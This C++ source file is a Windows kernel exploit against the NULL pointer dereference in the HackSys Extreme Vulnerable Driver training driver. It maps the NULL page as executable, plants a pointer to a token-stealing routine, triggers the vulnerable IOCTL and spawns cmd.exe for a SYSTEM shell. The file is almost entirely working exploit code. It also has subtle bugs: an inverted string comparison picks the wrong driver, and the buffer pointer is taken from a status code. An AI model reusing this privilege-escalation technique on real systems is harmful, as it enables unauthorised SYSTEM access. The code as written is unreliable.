#include <windows.h>
#include <psapi.h>
#include <tchar.h>
#include <stdio.h>

#define ARRAY_SIZE 1024
#define SIZE 100

extern "C" VOID StealToken();

// IOCTL to trigger the NULL page dereference vuln, copied from HackSysExtremeVulnerableDriver/Driver/HackSysExtremeVulnerableDriver.h
#define HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef NTSTATUS(WINAPI *ptrNtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG ZeroBits,
	PULONG AllocationSize,
	ULONG AllocationType,
	ULONG Protect
	);

LPVOID geNtoskrnlAddress()
{
	// Copied and modified from https://msdn.microsoft.com/en-us/library/windows/desktop/ms682619(v=vs.85).aspx
	
	TCHAR* ntoskrnl = "ntoskrnl.exe";
	LPVOID drivers[ARRAY_SIZE];
	DWORD cbNeeded;
	int cDrivers, i;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		TCHAR szDriver[ARRAY_SIZE];

		cDrivers = cbNeeded / sizeof(drivers[0]);
		for (i = 0; i < cDrivers; i++)
		{
			if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0])) && _tcscmp(ntoskrnl, szDriver))
			{
				printf("[+] Found address of ntoskrnl.exe: 0x%p.\n", drivers[i]);
				return (LPVOID)drivers[i];
			}
		}

		printf("[-] Could not find address of ntoskrnl.exe.\n");
		exit(-1);
	}
	
	printf("EnumDeviceDrivers failed; array size needed is %d\n", cbNeeded / sizeof(LPVOID));
	return NULL;
}

int main()
{
	// Resolve NtAllocateVirtualMemory
	ptrNtAllocateVirtualMemory NtAllocateVirtualMemory = (ptrNtAllocateVirtualMemory)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtAllocateVirtualMemory");
	if (NtAllocateVirtualMemory == NULL)
	{
		printf("[-] Failed to export NtAllocateVirtualMemory.");
		exit(-1);
	}

	printf("[+] Found address of NtAllocateVirtualMemory: 0x%p\n", NtAllocateVirtualMemory);

	// Get ntoskrnl.exe address
	LPVOID ntoskrnl_addr = geNtoskrnlAddress();

	// Create handle to driver
	HANDLE device = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	if (device == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to open handle to device.");
		return -1;
	}

	printf("[+] Opened handle to device: 0x%p.\n", device);

	// Allocate the NULL page
	// Copied and modified from http://www.rohitab.com/discuss/topic/34884-c-small-hax-to-avoid-crashing-ur-prog/
	LPVOID baseAddress = (LPVOID)0x1;
	ULONG allocSize = 0x1000;
	char* uBuffer = (char*)NtAllocateVirtualMemory(
		GetCurrentProcess(),
		&baseAddress,						// Putting a small non-zero value gets rounded down to page granularity, pointing to the NULL page
		0,
		&allocSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	*(INT_PTR*)(uBuffer + 4) = (INT_PTR)&StealToken;

	DWORD dummy;
	if(!VirtualProtect(0x0, 0x1000, PAGE_EXECUTE_READWRITE, &dummy))
	{
		printf("[-] Failed to allocate the NUL page.\n");
		exit(-1);
	}

	printf("[+] Successfully allocated the NULL page.\n");
	
	// Allocate the driver buffer
	char* driverBuffer = (char*)VirtualAlloc(
		NULL,
		SIZE,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (DeviceIoControl(
		device,
		HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE,
		driverBuffer,
		SIZE,
		NULL,
		0,
		&dummy,
		NULL
	))
	{
		printf("Done! Enjoy a shell shortly.\n\n");
		system("cmd.exe");
	}
	else
		printf("FUUUUUUUUUUUUUUUUUUUU.\n");
}
